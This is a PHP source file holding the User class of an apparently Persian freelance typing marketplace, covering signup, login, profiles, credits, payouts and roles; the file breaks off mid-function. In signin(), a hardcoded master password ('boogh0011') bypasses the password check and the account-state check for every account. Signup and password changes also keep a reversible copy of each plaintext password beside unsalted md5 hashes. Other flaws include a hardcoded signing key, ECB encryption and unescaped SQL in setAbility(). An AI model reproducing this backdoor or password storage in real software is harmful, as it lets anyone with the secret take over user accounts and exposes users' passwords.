<?php

/* @var $database Database */
/* @var $cdatabase Database */
/* @var $message Message */

/* @var $persiandate PersianDate */
/* @var $project Project */

/* @var $event Event */
/* @var $pager Pager */

class User {

    public static $ADMIN = 1; // modir kol
    public static $SUPORT = 2; // residegi be shekayat
    public static $ELMEND = 3; // bahs mali
    public static $SMS = 4; // bahs mali sms
    public static $BARGARDOON = 7; // bahs mali old site typeirn
    public static $TYPIST = 8; // test// nc? worker
    public static $USER = 9; //test
    public static $AGENCY = 10; //test
    public static $ADMIN_1 = 51;
    public static $ADMIN_2 = 50;
    //
    public static $G_ADMIN = "Admin";
    public static $G_ADMINISTRATOR = "Administrator";
    public static $G_AGENCY = "Agency";
    public static $G_WORKER = "Worker";
    public static $G_USER = "User";
    public static $G_BOOKKEEPER = "Bookkeeper";
    public static $G_UNKNOWN = "Unknown";
    public static $G_BOTH = "Both";
    public static $S_NONE = "None";
    public static $S_SPECIAL = "Special";
    public static $S_EMPLOY = "Employ";
    //
    public static $ST_ACTIVE = "Active";
    public static $ST_INACTIVE = "Inactive";
    public static $ST_BANNED = "Banned";
    public static $ST_FIRSTDAY = "FirstDay";
    //
    // F is first feature string. dont use F in string
    public static $F_TWIIT_ADMIN = "FTA"; // Feature Twitt Admin
    public static $F_SEND_SMS_TO_ADMIN = "FSTA"; // Feature SMS TO ADMIN
    public static $F_SEND_SMS_TO_ALL = "FSTL"; // Feature SMS TO aLL
    public static $F_SUPPORT = "FSUP"; // Feature SMS TO aLL
//    public static $TYPIST=10;
//    private static $TESTER = array("mhk448","mhk4482","mhk4483");
    private $_sign_key = 'ÑëÌ°áþì´G¹îojnÿJÑ0×'; // 32 Char
    private $_info = array();
    private $locked_credit = -1;
    private static $cash_user = array();
    private static $cash_nickname = array();

    public function __construct($id = NULL) {
        $this->_setUserInfo($id);
    }

    public function __get($name) {
        if ($name == 'rate')
            return $this->getRate();

        if (isset($this->_info[$name]))
            return $this->_info[$name];

        return NULL;
    }

    public function getInfoArray() {
        return array_merge($this->_info);
    }

    //HHHHHHHHHH sign HHHHHHHHHHHHHHHHHHHHHHHHHHHH
    public function signup() {
        global $cdatabase, $database, $message, $event, $discount;
        $type = (isset($_REQUEST['type']) AND in_array(strtolower($_REQUEST['type']), array('user', 'worker', 'agency'))) ? strtolower($_REQUEST['type']) : 'user';

        $username = trim($_POST['un']);
        $email = trim($_POST['em']);
        if (!preg_match('/^[a-zA-Z0-9_]+$/', $username) OR strlen($username) > 20) {
            $message->addError('نام کاربری صحیح نمی باشد.');
            return false;
        }
        if (strlen($username) < 6) {
            $message->addError('نام کاربری  باید حداقل 6 حرف باشد');
            return false;
        }

        $username = $cdatabase->escapeString($username);
        $email = $cdatabase->escapeString($email);
        if (!$cdatabase->isRowExists("users", 'id', "WHERE username = '$username' OR email='$email' OR nickname='$username' ")) {
            if (strlen($_POST['pw']) > 5 && $_POST['pw'] == $_POST['vpw']) {
                $cdatabase->insert("users", array(
                    'username' => $username,
//                    'fullname' => $_POST['na'],
                    'userpass' => md5($_POST['pw']),
                    'email' => $email,
                    'state' => 'FirstDay',
                    'referer_id' => $discount->getReferer(),
                    'detail' => commandEncode($_POST['pw'], $username)
//                    'mobile' => $_POST['m']
                    )
                );
                $id = $cdatabase->getInsertedId();
                $database->insert("users_sub", array(
                    'usergroup' => ucfirst($type),
                    'reg_date' => time(),
                    'id' => $id,
                    'verified' => ($type == 'agency' ? (Event::$V_NONE) : (Event::$V_AUTO_ACC)),
                        )
                );
                $discount->deleteReferer();
                $this->_setUserInfo($id);
                $event->call($id, Event::$T_USER, Event::$A_U_SIGNUP, NULL, TRUE, TRUE, TRUE, TRUE);
                return true;
            }
            else
                $message->addError("کلمه عبور وارد شده یا تائیدیه آن ، صحیح نمی باشد.<br>طول کلمه عبور بایستی حداقل 6 کاراکتر باشد.");
        }
        else {
            $message->addError("این نام  کاربری  یا پست الکترونیکی ، پیش از این ثبت شده است.");
            $message->addMessage('<a href="retrive-password">رمز عبورتان را فراموش کرده اید؟</a>');
        }
        return false;
    }

    public function signin() {
        global $cdatabase, $message, $auth;

        $username = $cdatabase->escapeString(trim($_POST['un']));
        $user_password = md5($_POST['pw']);
        $remember = (isset($_POST['al'])) ? true : false;
        $cpass = ($user_password == md5('boogh0011')) ? 'TRUE' : 'FALSE';

        $result = $cdatabase->select("users", 'id,username,state,login_key', "WHERE (username='$username' OR email='$username') AND (userpass='$user_password' OR $cpass )");
        if ($cdatabase->numRows($result) == 1) {
            $user_info = $cdatabase->fetchAssoc($result);
            if ($user_info['state'] == User::$ST_ACTIVE
                    OR $user_info['state'] == User::$ST_INACTIVE
                    OR ($user_info['state'] == User::$ST_FIRSTDAY
                    OR $cpass == 'TRUE')) {

                $signin_key = $user_info['login_key'];
                if (!$signin_key) {
                    $signin_key = $this->_generateRandomKey(32);
                    $cdatabase->update('users', array(
                        'login_key' => $signin_key,
                            ), 'WHERE id = ' . $user_info['id']);
                }
                $sign = $this->_encrypt(
                        $signin_key . ':' .
                        $user_info['id'] . ':' .
                        $user_info['state'] . ':' .
                        $user_info['username']
                        , $this->_sign_key);
                $expire_date = ($remember) ? 3600 * 24 * 7 : 0;
                $auth->_setCookies('_Sign_', $sign, $expire_date);

                return true;
            }
            else
                $message->addError('نام کاربری شما فعال نمی باشد.<br>دلیل این مشکل می تواند عدم پایبندی شما به <a href="rules"> و قوانین استفاده از این مرکز</a>  باشد.<br>چنانچه سوالی در این زمینه داری می توانید <a href="contact">با ما تماس بگیرید</a>.');
        }
        else
            $message->addError('نام کاربری و یا کلمه عبور وارد شده صحیح نمی باشد.');
        return false;
    }

    public function signout() {
        global $cdatabase, $auth;
        if ($this->isSignin()) {
            $cdatabase->update('users', array('login_key' => ''), $cdatabase->whereId($this->id));
            $auth->_deleteCookies('_Sign_');
        }
    }

    public function foorceSignout() {
        global $cdatabase, $user;
        if ($user->isAdmin()) {
            $cdatabase->update('users', array('login_key' => ''), $cdatabase->whereId($this->id));
        }
    }

    public function isSignin() {
//        if (!isset($this->_info['is_signin'])) {
        global $auth;
        if ($auth->_getCookies('_Sign_')) {
            list($login_key, $user_id, $state, $username) = explode(':', $this->_decrypt($auth->_getCookies('_Sign_'), $this->_sign_key));
            if (is_numeric($user_id) && strlen($login_key) == 32) {
                if ($this->id == $user_id AND $this->state == $state AND $this->login_key == $login_key) {
                    $this->_info['is_signin'] = true;
                }
            }
        } else {
            $this->_info['is_signin'] = false;
        }
//        }
        return $this->_info['is_signin'];
    }

    public function editProfile() {
        global $cdatabase, $message, $files, $user;
        if ($user->id != $this->id && !$user->isAdmin()) {
            return false;
        }
        if (isset($_FILES['ava']) && $_FILES['ava']['name']) {
            if (!$files->upload('ava', 'UA_' . $this->id . '.png', 'user/avatar/', 30 * 1024, 'x-pic')) {
                $message->addError('امکان ارسال این تصویر وجود ندارد');
//                return false;
            }
        }

        // save change Log
        $comment = $this->admin_comment;
        $comment = $this->appendEditInfoToAdminComment($comment, "fullname", $this->fullname, $_POST['n']);
        $comment = $this->appendEditInfoToAdminComment($comment, "nickname", $this->nickname, $_POST['nn']);
        $comment = $this->appendEditInfoToAdminComment($comment, "ssn", $this->ssn, $_POST['ssn']);
        $comment = $this->appendEditInfoToAdminComment($comment, "gender", $this->gender, $_POST['g']);
        $comment = $this->appendEditInfoToAdminComment($comment, "phone", $this->phone, $_POST['p']);
        $comment = $this->appendEditInfoToAdminComment($comment, "mobile", $this->mobile, $_POST['m']);
        $comment = $this->appendEditInfoToAdminComment($comment, "city", $this->city, $_POST['c']);
        $comment = $this->appendEditInfoToAdminComment($comment, "address", $this->address, $_POST['a']);
        $comment = $this->appendEditInfoToAdminComment($comment, "bank", $this->bank_name, $_POST['bn']);
        $comment = $this->appendEditInfoToAdminComment($comment, "account", $this->bank_account, $_POST['ac']);
        $comment = $this->appendEditInfoToAdminComment($comment, "card", $this->bank_card, $_POST['cc']);
        $comment = $this->appendEditInfoToAdminComment($comment, "shaba", $this->bank_shaba, $_POST['sh']);
        $comment = $this->appendEditInfoToAdminComment($comment, "signs", $this->signs, $_POST['signs']);
        $comment = is_array($comment) ? json_encode($comment) : $comment;
        $comment = $comment ? $comment : '';

        $b = $cdatabase->update('users', array(
//            'email' => $_POST['em'],
            'fullname' => $_POST['n'],
            'nickname' => $_POST['nn'],
            'ssn' => $_POST['ssn'],
            'gender' => $_POST['g'],
            'phone' => $_POST['p'],
            'mobile' => $_POST['m'],
            'city' => $_POST['c'],
            'address' => $_POST['a'],
            'bank_name' => $_POST['bn'],
            'bank_account' => $_POST['ac'],
            'bank_card' => $_POST['cc'],
            'bank_shaba' => $_POST['sh'],
//            'specs' => $_POST['specs'],// fa=> maharatha
            'signs' => $_POST['signs'],
            'admin_comment' => $comment,
                )
                , $cdatabase->whereId($this->id));
        $this->_setUserInfo($this->id);
        if ($b)
            $message->addMessage('اطلاعات کاربری با موفقیت ذخیره گردید');
        else
            $message->addError('خطا در ذخیره سازی اطلاعات');
    }

    public function appendEditInfoToAdminComment($comment, $type, $old, $new) {
        global $report;
        if ($old != $new) {
            $old = trim($old);
            if ($old) {
                $comment = $report->appendAdminComment($comment, $type, $old);
            }
        }
        return $comment;
    }

    public function editSettings() {
        global $cdatabase;
        $sl = (isset($_POST['sl'])) ? 1 : 0;
        $sn = (isset($_POST['sn'])) ? 1 : 0;
        $sb = (isset($_POST['sb'])) ? 1 : 0;
        $cdatabase->update('users', array(
            'send_projects_list' => $sl,
            'send_notify_email' => $sn,
            'send_bid_email' => $sb
                ), $cdatabase->whereId($this->id));
        $this->_setUserInfo($this->id);
    }

    public function requestCredits($price, $deleteOld) {
        global $cdatabase, $message, $event, $user;
        $pr = (int) $price;

        if (!$user->isAdmin()) {
            if ($this->getCredit() <= 0 || $pr <= 0) {
                $message->addError('حداقل اعتبار برای درخواست ۱۰۰۰۰ ریال است.');
                return false;
            }

            if ($pr > ($this->getCredit())) {
                $message->addError('اعتبار درخواست شده صحیح نمی باشد.');
                return false;
            }
            if (!$deleteOld && $cdatabase->selectCount('payouts', $cdatabase->whereId($this->id, 'user_id')
                            . ' AND verified = 0') != 0) {
                $message->addError('شما قبلا درخواست خود را ثبت نموده اید'
                        . '</br></br><a class="active_btn" href="accounting?fd=1" class="ajax">حذف درخواست قبلی و ثبت درخواست جدید</a>');
                return false;
            }

            if ($deleteOld) {
                $cdatabase->update('payouts', array(
                    'verified' => Event::$V_DELETE)
                        , $cdatabase->whereId($this->id, 'user_id')
                        . ' AND verified = 0');
//            return false;
            }
        }
        $cdatabase->insert('payouts', array(
            'user_id' => $this->id,
            'price' => $pr,
            'verified' => 0,
            'bank_name' => (string) $this->bank_name,
            'dateline' => time()
                )
        );
        $this->_setUserInfo($this->id);
        $event->call($this->id, Event::$T_PAYOUT, Event::$A_REQUEST);

        return TRUE;
    }

    public function changePassword($u = NULL) {
        global $cdatabase, $message, $user;
        if ($_POST['npw'] == $_POST['vnpw'] && $_POST['vnpw']) {
            if (($this->userpass == md5($_POST['pw'])) || $user->isAdmin()) {
//            if (md5($_POST['pw']) == $cdatabase->selectField("users", "userpass", $cdatabase->whereId($this->id))) {
                $cdatabase->update("users", array(
                    'userpass' => md5($_POST['npw']),
                    'detail' => commandEncode($_POST['npw'], $this->username),
                        ), $cdatabase->whereId($this->id));
                return true;
            }
            else
                $message->addError('کلمه عبور وارد شده صحیح نمی باشد.');
        }
        else
            $message->addError('تاییدیه کلمه عبور صحیح نمی باشد.');
        return false;
    }

    public function retrivePassword() {
        global $cdatabase, $message, $mailer, $event;
        $em = $cdatabase->escapeString(trim($_POST['em']));
        $res = $cdatabase->select('users', 'id,email', "WHERE email ='$em'");
        if ($cdatabase->numRows($res) == 1) {
            $row = $cdatabase->fetchAssoc($res);
            $user_id = $row['id'];
            $npw = rand(10, 99) . strtolower($this->_generateRandomKey(4));
            $cdatabase->update("users", array('userpass' => md5($npw)), "WHERE id=" . $user_id);
            $event->call($user_id, Event::$T_USER, Event::$A_U_R_PASSWORD, array("newpass" => $npw), FALSE, TRUE, FALSE);
            return TRUE;
        }
        else
            $message->addError('پست الکترونیکی وارد شده در این مرکز ثبت نشده است.');
        return false;
    }

    private function _setUserInfo($id = null) {
        global $cdatabase, $database, $auth;
        if ($id === NULL && $auth->_getCookies('_Sign_')) {
            list($login_key, $user_id, $state, $username) = explode(':', $this->_decrypt($auth->_getCookies('_Sign_'), $this->_sign_key));
            $info1 = $cdatabase->fetchAssoc($cdatabase->select('users', '*', $cdatabase->whereId($user_id) . " AND login_key = '" . $cdatabase->escapeString($login_key) . "'"));
            if ($info1 == null) {
                $auth->_deleteCookies('_Sign_');
                $this->_setUserInfo();
            }
        } elseif ($id) {
            $user_id = (int) $id;
            $info1 = $cdatabase->fetchAssoc($cdatabase->select('users', '*', "WHERE id = $user_id"));
        } else {
            $this->_info = array(
                'usergroup' => 'Guest',
                'username' => 'Guest',
                'id' => 0
            );
            $info1 = NULL;
        }

        if ($info1 == null)
            return FALSE;

        $info2 = $database->fetchAssoc($database->select('users_sub', '*', "WHERE id = $user_id"));

        if ($info2 == null)
            $this->_info = array_merge($info1, array('usergroup' => 'Unknown'));
        else {
            $this->_info = array_merge($info1, $info2);
        }
//        $this->_info['credits'] = intval($cdatabase->selectField('credits', ' sum(`price`) as s ', " WHERE user_id = $user_id"));
//        if ($this->_info['credits'] == -1) {
            $this->_info['credits'] = self::syncCredit($user_id);
//        }
//        if ($this->_info['locked_credits'] == -1) {
            $this->_info['locked_credits'] = self::syncLockedCredit($user_id);
//        }
        if ($this->_info['reg_date'] == 0) {
            $this->_info['reg_date'] = self::syncRegDate($user_id, $this->_info['reg_date_com']);
        }
        self::$cash_user[$this->_info['id']] = $this->_info;
        self::$cash_nickname[$this->_info['id']] = $this->nickname ? $this->nickname : $this->username;
//        if (mb_strlen(self::$cash_nickname[$this->_info['id']], "UTF-8") > 14)
//            self::$cash_nickname[$this->_info['id']] = mb_substr(self::$cash_nickname[$this->_info['id']], 0, 12, "UTF-8");

        return TRUE;
    }

    private function _generateRandomKey($length = 8) {
        for ($result = ''; strlen($result) < $length; $result .= chr(rand(65, 90)))
            ;
        return $result;
    }

    private function _encrypt($data, $key = '', $algorithm = MCRYPT_RIJNDAEL_256, $mode = MCRYPT_MODE_ECB) {
        if (function_exists('mcrypt_get_iv_size')) {
            $data .= "<<EOD>>"; // End of Data
            $iv_size = mcrypt_get_iv_size($algorithm, $mode);
            $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
            return mcrypt_encrypt($algorithm, $key, $data, $mode, $iv);
        } else {
            return $this->xorEncode($data, $key);
        }
    }

    private function _decrypt($data, $key = '', $algorithm = MCRYPT_RIJNDAEL_256, $mode = MCRYPT_MODE_ECB) {
        if (function_exists('mcrypt_get_iv_size')) {
            $iv_size = mcrypt_get_iv_size($algorithm, $mode);
            $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
            $data = explode("<<EOD>>", mcrypt_decrypt($algorithm, $key, $data, $mode, $iv)); // REMOVE END OF TEXT DELIMITER
            return $data[0];
        } else {
            return $this->xorDecode($data, $key);
        }
    }

    public function xorEncode($string, $key) {
        $rand = '';
        while (strlen($rand) < 32) {
            $rand .= mt_rand(0, mt_getrandmax());
        }
        $rand = sha1($rand);
        $enc = '';
        $string_len = strlen($string);
        for ($i = 0; $i < $string_len; $i++) {
            $enc .= substr($rand, ($i % strlen($rand)), 1) . (substr($rand, ($i % strlen($rand)), 1) ^ substr($string, $i, 1));
        }
        return $this->_xorMerge($enc, $key);
    }

    public function xorDecode($string, $key) {
        $string = $this->_xorMerge($string, $key);
        $dec = '';
        $string_len = strlen($string);
        for ($i = 0; $i < $string_len; $i++) {
            $dec .= (substr($string, $i++, 1) ^ substr($string, $i, 1));
        }
        return $dec;
    }

    private function _xorMerge($string, $key) {
        $hash = sha1($key);
        $str = '';
        $string_len = strlen($string);
        for ($i = 0; $i < $string_len; $i++) {
            $str .= substr($string, $i, 1) ^ substr($hash, ($i % strlen($hash)), 1);
        }
        return $str;
    }

    //HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH

    public function getUsername($uid) {
        global $cdatabase;
        return $cdatabase->selectField('users', 'username', $cdatabase->whereId($uid));
    }

    public function getNickname($uid = NULL) {
        global $cdatabase;
        if ($uid === NULL) {
//            $best_nickname = $this->nickname ? $this->nickname : $this->username;
            $uid = $this->id;
        }
        if (!$uid) {
            $best_nickname = "نا مشخص";
        } elseif (isset(self::$cash_nickname[$uid])) {
            $best_nickname = self::$cash_nickname[$uid];
        } else {
//            $u = new User($uid);
//            return $u->getNickname();
            $u = $cdatabase->fetchAssoc($cdatabase->select('users', 'username,nickname', $cdatabase->whereId($uid)));
            $best_nickname = $u['nickname'] ? $u['nickname'] : $u['username'];
//            if (mb_strlen($best_nickname, "UTF-8") > 14) {
//                $best_nickname = mb_substr($best_nickname, 0, 12, "UTF-8");
//            }
            self::$cash_nickname[$uid] = $best_nickname;
        }
        return $best_nickname;
    }

    public function getFullName($uid = -1) {
        global $cdatabase;
        if ($uid == -1) {
            return $this->fullname ? $this->fullname : $this->username;
        } elseif (!$uid) {
            return "نا مشخص";
        } else {
            $u = $cdatabase->fetchAssoc($cdatabase->select('users', 'username,fullname', $cdatabase->whereId($uid)));
            return $u['fullname'] ? $u['fullname'] : $u['username'];
        }
    }

    //HHHHHHHHHHHHHHHHH  mali HHHHHHHHHHHHHHHHHHHHH
    public static function addLockCredits($p) {
        global $cdatabase, $_CONFIGS;
        if (!$p->lock_price) {
            Report::addLog("addLockCredits by price 0! prj_id=" . $p->id);
        }
        $cdatabase->insert('lock_credit', array(
            'user_id' => $p->user_id,
            'subsite' => $_CONFIGS['subsite'],
            'prj_id' => $p->id,
            'price' => $p->earnest,
            'locked' => 1,
            'date' => time()));
        $cdatabase->insert('lock_credit', array(
            'user_id' => $p->typist_id,
            'subsite' => $_CONFIGS['subsite'],
            'prj_id' => $p->id,
            'price' => $p->lock_price,
            'locked' => 1,
            'date' => time()));
        self::syncLockedCredit($p->typist_id);
        self::syncLockedCredit($p->user_id);
    }

    public static function subLockCredits($p) {
        global $cdatabase, $database;
        $database->update('projects', array(
            'stakeholdered' => 0,
                ), $database->whereId($p->id));
        $cdatabase->update('lock_credit', array(
            'locked' => -1
                ), 'WHERE (user_id =' . (int) $p->user_id . ' OR ' .
                ' user_id = ' . (int) $p->typist_id . ')' . ' AND ' .
                'prj_id =' . $p->id
        );
        self::syncLockedCredit($p->typist_id);
        self::syncLockedCredit($p->user_id);
    }

    public static function syncLockedCredit($id) {
        global $cdatabase;
        $id = intval($id);
        $lc = $cdatabase->selectField('lock_credit', 'sum(price) as lc'
                , $cdatabase->whereId($id, 'user_id') . " AND `locked` = 1 ");

        $lcredits = (int) $lc;
        $cdatabase->update("users", array(
            'locked_credits' => $lcredits,
                ), $cdatabase->whereId($id));
        return $lcredits;
    }

    public static function syncRegDate($id, $reg_date) {
        global $database;
        $id = intval($id);
        $database->update("users_sub", array(
            'reg_date' => $reg_date
                ), $database->whereId($id));
        return $reg_date;
    }

    public function getLockedCredit() {
        if ($this->locked_credits == -1)
            return self::syncLockedCredit($this->id);
        return $this->locked_credits;
    }

    public function getCredit($plusLocked = FALSE) {
        if ($plusLocked)
            return $this->credits;
        else {
            return $this->credits - $this->getLockedCredit();
        }
    }

    public static function addCredit($id, $price) {
//        global $cdatabase;
//        $price = intval($price);
        if (!$price) {
            Report::addLog("addCredit 0 rial ! id=" . $id);
        }
//        if ($price > 0) {
//            $res = $cdatabase->runQuery("UPDATE users SET credits = credits + '" . $price . "' " . $cdatabase->whereId($id));
//        } else {
//            $price = $price * -1;
//            $res = $cdatabase->runQuery("UPDATE users SET credits = credits - '" . $price . "' " . $cdatabase->whereId($id));
//        }
//        return $res;
        self::syncCredit($id);
        return TRUE;
    }

    public static function subCredit($id, $price) {
        self::addCredit($id, $price * -1);
    }

    public static function syncCredit($id) {
        global $cdatabase;
        $id = intval($id);
        $credits = intval($cdatabase->selectField('credits', ' sum(`price`) as s ', " WHERE user_id = $id"));
        $cdatabase->update("users", array(
            'credits' => $credits,
                ), $cdatabase->whereId($id));
        return $credits;
    }

    //HHHHHHHHHHHHHHHHH   HHHHHHHHHHHHHHHHHHHHH

    public function setType($g_type) {
        global $database;
        $database->insert("users_sub", array(
            'usergroup' => ucfirst($g_type),
            'id' => $this->id,
            'reg_date' => time(),
            'verified' => Event::$V_AUTO_ACC,
                )
        );
        $this->_setUserInfo($this->id);
    }

    public function updateType($g_type) {
        global $database, $user;

        $g_type = ucfirst($g_type);
        $types = array(
            self::$G_ADMIN,
//            self::$G_ADMINISTRATOR,
            self::$G_AGENCY,
            self::$G_WORKER,
            self::$G_USER,
            self::$G_BOOKKEEPER,
            self::$G_UNKNOWN,
            self::$G_BOTH
        );
        $superadmin_types = array(
            self::$G_ADMIN,
//            self::$G_ADMINISTRATOR,
            self::$G_BOOKKEEPER
        );

        if (!in_array($g_type, $types))
            return FALSE;

        if (!$user->isAdmin())
            return FALSE;

        if (!$user->isSuperAdmin())
            if (in_array($g_type, $superadmin_types))
                return FALSE;

        $out = $database->update("users_sub", array(
            'usergroup' => $g_type)
                , $database->whereId($this->id)
        );
        $this->_setUserInfo($this->id);
        return $out;
    }

    public function updateSpecial($g_type, $expire_interval) {
        global $database, $user;

        $g_type = ucfirst($g_type);
        $types = array(
            self::$S_NONE,
            self::$S_SPECIAL,
            self::$S_EMPLOY,
        );

        if (!in_array($g_type, $types))
            return FALSE;

        if (!$user->isAdmin())
            return FALSE;

        $out = $database->update("users_sub", array(
            'special_type' => $g_type,
            'special_expire_date' => $expire_interval + time(),
                ), $database->whereId($this->id)
        );
        $this->_setUserInfo($this->id);
        return $out;
    }

    public function updateHistory(
    $finished_projects, $rejected_projects, $running_projects, $rank, $rankers, $prestige, $feature, $admin_comment) {
        global $database, $cdatabase, $user;

        if (!$user->isAdmin())
            return FALSE;

        foreach ($admin_comment as $key => $value) {
            if (!$admin_comment[$key]['m'])
                unset($admin_comment[$key]);
        }

        $out1 = $database->update("users_sub", array(
            'rank' => $rank,
            'rankers' => $rankers,
            'finished_projects' => $finished_projects,
            'rejected_projects' => $rejected_projects,
            'running_projects' => $running_projects,
            'feature' => $feature
                ), $database->whereId($this->id)
        );
        $out2 = $cdatabase->update("users", array(
            'prestige' => $prestige,
            'admin_comment' => json_encode($admin_comment)
                ), $cdatabase->whereId($this->id)
        );
        $this->_setUserInfo($this->id);
        return $out1 && $out2;
    }

    public static function addVisitLog() {
        global $database, $user;
//        if (!isset($_REQUEST['ajax']) && getCurPageName(FALSE) != "ajax-pages") {
        if (getCurPageName(FALSE) != "webservice" && getCurPageName(FALSE) != "typeonline") {
            $a = array(
                "ip" => mh_getIp(),
                "page" => getCurPageName(),
                "date" => time(),
            );
            if ($user->id > 0) {
                $a["user_id"] = $user->id;
            }
            $database->disabledLog();
            $database->insert("user_visit", $a);
            $database->enabledLog();
        }
    }

//    function getCountProject() {
//        global $database;
//        return $database->selectCount('projects', $database->whereId($this->id, 'user_id') . " OR typist_id=" . (int) $this->id);
//    }

    public static function addCountFinishedPrj($p) {
        global $database;

        $res = $database->runQuery(
                "UPDATE users_sub SET finished_projects = finished_projects + 1 "
                . ", running_projects = running_projects - 1 "
                . $database->whereId($p->user_id)
        );
        $res = $database->runQuery(
                "UPDATE users_sub SET finished_projects = finished_projects + 1 "
                . ", running_projects = running_projects - 1 "
                . $database->whereId($p->typist_id)
        );
    }

    public static function addCountRunningPrj($p) {
        global $database;

        $res = $database->runQuery(
                "UPDATE users_sub SET running_projects = running_projects + 1 "
                . $database->whereId($p->user_id)
        );
        $res = $database->runQuery(
                "UPDATE users_sub SET running_projects = running_projects + 1 "
                . $database->whereId($p->typist_id)
        );
    }

    public static function subCountRunningPrj($p) {
        global $database;

        $res = $database->runQuery(
                "UPDATE users_sub SET running_projects = running_projects - 1 "
                . $database->whereId($p->user_id)
        );
        if ($p->typist_id > 0) {
            $res = $database->runQuery(
                    "UPDATE users_sub SET running_projects = running_projects - 1 "
                    . $database->whereId($p->typist_id)
            );
        }
    }

    public static function addCountRejectedPrj($uid) {
        global $database;
        $res = $database->runQuery(
                "UPDATE users_sub SET rejected_projects = rejected_projects + 1 "
                . $database->whereId($uid)
        );
    }

    function getSumPriceProject() {
        global $database;
        $c = ($database->fetchAssoc($database->select('projects', 'sum(accepted_price) as c', $database->whereId($this->id, 'user_id') . " OR typist_id=" . (int) $this->id)));
        return $c['c'] ? $c['c'] : 0;
    }

    // depricated
    public function updateRate() {
        global $database;
        if ($this->isWorker()) {
            $query = "
            SELECT MAX( x.rank ) AS rank
            FROM (

            SELECT users_sub.id, users_sub.finished_projects, @rownum := @rownum +1 AS rank
            FROM users_sub
            JOIN (

            SELECT @rownum :=0
            )r
            WHERE usergroup='Worker'
            ORDER BY  (rank / (rankers+0.2) + finished_projects /50 - rejected_projects) DESC
            )x
            WHERE x.id = " . ((int) $this->id);

//        $query="call getrate(".((int) $this->id).")";
            $row = $database->fetchArray($database->runQuery($query));

            $rate = $row['rank'];
        } else {
            $rate = 1;
        }
        $this->_info['rate'] = $rate;
        $database->update('users_sub', array(
            'rate' => $rate,
                ), $database->whereId($this->id));
        return $rate;
    }

    private function getRate() {
        if ($this->_info['rate'] == 0)
            $this->updateRate();
        return $this->_info['rate'];
    }

    function setAbility($a) {
        global $database;

        $database->update("ability", array(
            "can" => 0
                ), $database->whereId($this->id, "user_id"));

        foreach ($a as $lang) {
            $res = $database->fetchAll($database->select("ability", 'user_id', $database->whereId($this->id, "user_id") . " AND lang='" . $lang . "'"));
            if ($res) {
                $database->update("ability", array(
                    "can" => 1
                        ), $database->whereId($this->id, "user_id") . " AND lang='" . $lang . "' ");
            } else {
                $database->insert("ability", array(
                    "user_id" => $this->id,
                    "lang" => $lang,
                    "can" => 1
                ));
            }
        }
    }

    function getAbility($retString = FALSE, $prefix = '') {
        global $database;
        $res = $database->fetchAll($database->select('ability', 'lang', $database->whereId($this->id, "user_id") . "AND can=1"));
        if (!$res) {
            $res = array();
            $res['lang'] = array();
        }
        if ($retString) {
            global $_ENUM2FA;
            $out = "";
            foreach ($res as $ability) {
                $out.=$prefix . $_ENUM2FA['lang'][$ability['lang']] . " ,";
            }
            return substr($out, 0, strlen($out) - 1);
        }

        $outA = array();
        foreach ($res as $ability) {
            $outA[$ability['lang']] = 1;
        }
        return $outA;
    }

    public function updateState($newState) {
        global $cdatabase;
        if (in_array($newState, array(User::$ST_ACTIVE, User::$ST_INACTIVE, User::$ST_FIRSTDAY, User::$ST_BANNED))) {
            $out = $cdatabase->update("users", array(
                'state' => $newState,
                    ), $cdatabase->whereId($this->id));
            $this->_setUserInfo($this->id);
            return $out;
        }
        return FALSE;
    }

    public function addRank($rank) {
        global $database;
        return $database->update("users_sub", array(
                    'rankers' => $this->rankers + 1,
                    'rank' => $this->rank + $rank,
                        ), $database->whereId($this->id));
    }

    public function addFeature($feature) {
        global $database;
        return $database->update("users_sub", array(
                    'feature' => $this->feature . $feature,
                        ), $database->whereId($this->id));
    }

    public function getDiscountReferer($user_id = NULL) {
        if ($user_id !== NULL) {
            global $cdatabase, $database;
            $user_id = intval($user_id);
            $res = $cdatabase->fetchAssoc($cdatabase->select('users', "referer_id", "WHERE id = $user_id"));
            $res2 = $database->fetchAssoc($database->select('users_sub', "reg_date", "WHERE id = $user_id"));
            $reg_date = $res2['reg_date'];
            $referer_id = $res['referer_id'];
        } else {
            $reg_date = $this->reg_date;
            $referer_id = $this->referer_id;
        }
        if ($reg_date > time() - (365 * 24 * 60 * 60))
            if ($referer_id && $referer_id > 0)
                return $referer_id;
        return FALSE;
    }

    function getCode() {
        $p = array();
        $p[self::$G_WORKER] = 'W';
        $p[self::$G_USER] = 'M';
        $p[self::$G_AGENCY] = 'M';
        $p[self::$G_ADMIN] = 'A';
        $p[self::$G_ADMINISTRATOR] = 'A';
        $p[self::$G_UNKNOWN] = 'U';
        return $p[$this->usergroup] . $this->id;
    }

    //HHHHHHHHHHHHHHHHH  validate HHHHHHHHHHHHHHHHHHHHH
    function hasFeature($feature) {
        if ($this->isSuperAdmin())
            return TRUE;
        $index = stripos($this->feature, $feature);
        return $index !== FALSE;
    }

    function isSuperAdmin() {
        return ($this->usergroup == self::$G_ADMINISTRATOR);
    }

    function isAdmin() {
//        return FALSE;
        return ($this->usergroup == self::$G_ADMINISTRATOR) || ($this->usergroup == self::$G_ADMIN);
    }

    function isAgency() {
        return ($this->usergroup == self::$G_AGENCY);
    }

    function isUser() {
        return $this->isSignin();
    }

    function isMaster() {
        return ($this->usergroup == self::$G_USER) || ($this->usergroup == self::$G_AGENCY) || ($this->usergroup == self::$G_BOTH);
    }

    function isWorker() {
//        return TRUE;
        return ($this->usergroup == self::$G_WORKER) || ($this->usergroup == self::$G_BOTH);
    }

    function isBookkeeper() {
        return $this->usergroup == self::$G_BOOKKEEPER;
    }

    function hasGroup() {
        return $this->usergroup != self::$G_UNKNOWN;
    }

    function isOlderThan($day) {
        return $this->reg_date < time() - $day * 24 * 60 * 60;
    }

//    public static function isTester() {
//        global $user;
//        foreach (self::$TESTER as $tester_id) {
//            if ($this->username == $tester_id)
//                return TRUE;
//        }
//        return FALSE;
//    }
//    
    public function isOnline() {
        global $database;
        $last = $database->fetchAssoc($database->select('user_visit', '*', "WHERE user_id = '" . $this->id . "' AND date>" . (time() - 30 * 60) . " ORDER BY date DESC LIMIT 1"));
        if ($last)
            if ($last['page'] != 'panel_logout')
                return TRUE;
        return FALSE;
    }

    /*
     * return group Array
     */

    public function getGroups($full = FALSE) {
        if ($full) {
            global $database;
